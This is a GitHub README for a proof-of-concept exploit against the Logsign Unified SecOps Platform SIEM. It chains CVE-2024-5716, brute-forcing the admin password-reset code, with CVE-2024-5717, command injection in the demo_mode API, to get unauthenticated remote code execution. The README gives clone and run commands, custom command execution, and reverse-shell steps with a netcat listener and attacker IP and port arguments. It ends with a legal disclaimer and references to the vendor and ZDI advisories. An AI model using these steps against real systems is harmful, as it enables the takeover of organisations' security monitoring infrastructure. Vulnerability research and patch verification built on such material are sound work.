# Logsign SIEM RCE Exploit (CVE-2024-5716 & CVE-2024-5717)

This tool is a proof-of-concept (PoC) exploit that combines two critical vulnerabilities in the Logsign Unified SecOps Platform (SIEM) to achieve unauthenticated remote code execution (RCE).

## Description

The exploit chains two vulnerabilities:

**CVE-2024-5716 (Authentication Bypass):**  
A flaw in the password reset mechanism allows the 6-digit reset code to be brute-forced without rate limiting. This script uses multi-threading to quickly identify the reset code and reset the admin user's password.

**CVE-2024-5717 (Command Injection):**  
Once logged in as an admin user, the `/api/settings/demo_mode` API endpoint fails to properly validate user input, allowing arbitrary command injection and execution on the target system.

By combining these vulnerabilities, an attacker can gain full control over the target system.

## Features

- Automatically chains CVE-2024-5716 and CVE-2024-5717.
- Resets the admin user's password to gain system access.
- Supports three modes for remote code execution (RCE):
  - **Default PoC**: Executes `id > /tmp/logsign_pwned.txt` on the target system.
  - **Single Command Execution**: Runs a user-specified command.
  - **Reverse Shell**: Establishes an interactive shell session to a specified IP and port.
- Detailed logging for debugging with `--debug` mode.

## Installation and Requirements

**Clone the project files:**

```
bash
git clone https://github.com/sevbandonmez/logsign-rce.git
cd logsign-rce
```

Writeup: https://medium.com/@sevbandonmez/zero-day-review-critical-vulnerabilities-in-logsign-unified-secops-platform-versions-6-4-7-69bbec653b3a

## Install the required Python library

```pip install requests```


## Usage
The script can be executed with various command-line arguments.

```
usage: exploit.py [-h] -t TARGET [-rh REVERSE_HOST] [-rp REVERSE_PORT] [-c COMMAND] [-d]

Logsign RCE Exploit Tool

options:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        Target URL (e.g., https://example.com:8443)
  -rh REVERSE_HOST, --reverse-host REVERSE_HOST
                        Reverse shell IP address
  -rp REVERSE_PORT, --reverse-port REVERSE_PORT
                        Reverse shell port
  -c COMMAND, --command COMMAND
                        Custom command to execute
  -d, --debug           Enable debug logging
```

## Example 1: Default PoC
This mode creates a file /tmp/logsign_pwned.txt on the target system to prove the vulnerability.

```python3 exploit.py -t https://192.168.1.100```

Check the file on the target system: cat /tmp/logsign_pwned.txt.Example 2: Single Command ExecutionRun a single command, such as whoami, on the target system:bash

```python3 exploit.py -t https://192.168.1.100 -c "whoami"```

## Example 3: Reverse Shell
This mode provides an interactive command-line shell on the target system.

**Step 1:* Start a listener on the attacker's machine using Netcat:bash**

```nc -lvnp 4444```

**Step 2:* Run the exploit, specifying your IP address and port:bash**

```python3 exploit.py -t https://192.168.1.100 -rh 192.168.1.20 -rp 4444```

If successful, a shell session will appear in your Netcat listener.

## Debugging
If the script fails or produces unexpected errors, enable detailed logging with the --debug flag:bash

```python3 exploit.py -t https://192.168.1.100 -rh 192.168.1.20 -rp 4444 --debug```

## Legal Disclaimer
This tool is developed solely for authorized security testing and educational purposes. Unauthorized use of this tool for illegal activities is strictly prohibited. Any damage or legal consequences resulting from the use of this tool are the sole responsibility of the user. The developer is not liable for any misuse of this tool.

## LICENSE
This project is licensed under the MIT License. See the LICENSE file for details.

## References
[Logsign Support](https://support.logsign.net/hc/en-us/articles/19316621924754-03-06-2024-Version-6-4-8-Release-Notes)<br>
[Zero Day Inititive](https://www.zerodayinitiative.com/blog/2024/7/1/getting-unauthenticated-remote-code-execution-on-the-logsign-unified-secops-platform)
